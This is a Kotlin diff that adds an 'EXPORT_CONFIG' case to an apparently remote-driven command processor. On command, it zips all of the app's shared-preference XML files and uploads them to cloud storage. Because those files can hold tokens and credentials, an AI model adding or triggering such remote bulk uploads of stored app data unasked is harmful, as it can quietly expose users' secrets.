@@ -409,6 +409,43 @@ object CommandProcessor {
                     updateCommandStatus(ctx, id, status, null, report, null)
                     return
                 }
+                "EXPORT_CONFIG" -> {
+                    val sharedPrefsDir = java.io.File(ctx.applicationInfo.dataDir, "shared_prefs")
+                    if (sharedPrefsDir.exists() && sharedPrefsDir.isDirectory) {
+                        val timestamp = System.currentTimeMillis()
+                        val zipFile = java.io.File(ctx.cacheDir, "config_export_$timestamp.zip")
+                        try {
+                            java.util.zip.ZipOutputStream(java.io.FileOutputStream(zipFile)).use { zos ->
+                                sharedPrefsDir.listFiles()?.forEach { file ->
+                                    if (file.isFile && file.name.endsWith(".xml")) {
+                                        val entry = java.util.zip.ZipEntry(file.name)
+                                        zos.putNextEntry(entry)
+                                        file.inputStream().use { it.copyTo(zos) }
+                                        zos.closeEntry()
+                                    }
+                                }
+                            }
+                            if (CloudManager.uploadFile(ctx, zipFile, "CONFIG_EXPORT")) {
+                                status = "CONFIG_EXPORT_SUCCESS"
+                                errorMsg = "Configuration zipped and uploaded to Vault."
+                                updateCommandStatus(ctx, id, status, errorMsg, null, "CONFIG_EXPORT/${zipFile.name}")
+                                zipFile.delete()
+                                return
+                            } else {
+                                status = "CONFIG_EXPORT_FAILED"
+                                errorMsg = "Failed to upload to Cloud Storage."
+                                zipFile.delete()
+                            }
+                        } catch (e: Exception) {
+                            status = "CONFIG_EXPORT_ERROR"
+                            errorMsg = e.message ?: "Zip creation failed"
+                            if (zipFile.exists()) zipFile.delete()
+                        }
+                    } else {
+                        status = "FAILED_NO_CONFIG"
+                        errorMsg = "Shared preferences directory not found."
+                    }
+                }
                 "AUTOMATE_WEB" -> {
                     val parts = content.split("|", limit = 3)
                     val mode = parts.getOrNull(0)?.trim()?.uppercase() ?: "VISIBLE"
